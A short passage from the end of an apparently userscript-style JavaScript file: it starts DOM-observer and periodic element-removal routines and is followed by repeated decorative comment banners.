        configureMutationObserver();
        periodicCheckForTextContent();
        periodicCheckAndRemoveZvElement();
    });
})();
 }
//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY
//------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY----------
//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY
//------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY----------
//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


